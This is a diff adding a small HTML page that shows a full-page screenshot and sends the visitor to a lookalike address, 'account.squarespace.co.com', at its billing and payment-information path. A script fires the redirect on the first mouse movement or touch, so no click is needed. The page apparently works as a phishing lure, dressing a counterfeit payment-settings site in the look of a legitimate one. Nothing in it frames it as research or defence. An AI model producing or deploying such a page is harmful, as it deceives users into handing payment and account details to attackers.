@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect on Interaction</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+        }
+        body, html {
+            width: 100%;
+            margin: 0;
+            padding: 0;
+        }
+        img {
+            display: block;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <a href="https://account.squarespace.co.com/config/settings/billing/payment-information" id="imageLink">
+        <img src="https://i.ibb.co/yNpKd1h/Screen-Shot-2024-12-12-at-10-16-40-fullpage.png" alt="Long Scrollable Image">
+    </a>
+    <script>
+        let triggered = false; // Ensure it only redirects once
+
+        function redirectToLink() {
+            if (!triggered) {
+                triggered = true;
+                window.location.href = document.getElementById('imageLink').href;
+            }
+        }
+
+        // Detect mouse movement (desktop) or touchstart (mobile)
+        document.addEventListener('mousemove', redirectToLink);
+        document.addEventListener('touchstart', redirectToLink);
+    </script>
+</body>
+</html>
